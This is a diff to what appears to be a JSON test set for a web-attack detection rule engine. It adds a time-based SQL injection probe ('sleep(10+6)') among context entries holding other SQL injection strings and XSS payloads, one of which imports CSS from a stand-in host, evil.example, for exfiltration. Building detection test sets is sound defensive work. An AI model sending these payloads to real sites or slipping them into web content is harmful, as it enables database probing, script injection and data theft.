@@ -161,6 +161,7 @@
     {"id": "sqli-116", "rule": "sqli", "payload": "id'not like id--", "note": "negación pegada a la comilla"},
     {"id": "sqli-117", "rule": "sqli", "payload": "id' is not id--", "note": "`is not` tras cierre de comilla"},
     {"id": "sqli-118", "rule": "sqli", "payload": "?x=CHR(113)||CHR(122)", "note": "construcción de strings sin comillas (Oracle)"},
+    {"id": "sqli-119", "rule": "sqli", "payload": "sleep(10+6)", "note": "el + de un body es literal para la app: es el operador de MySQL, no un espacio"},
     {"id": "xss-105", "rule": "xss", "payload": "<STYLE>@import'http://evil.example/x.css';</STYLE>", "note": "exfiltración por CSS"},
     {"id": "xss-106", "rule": "xss", "payload": "?q=expression(alert(1))", "note": "expression() de CSS (IE)"}
   ]
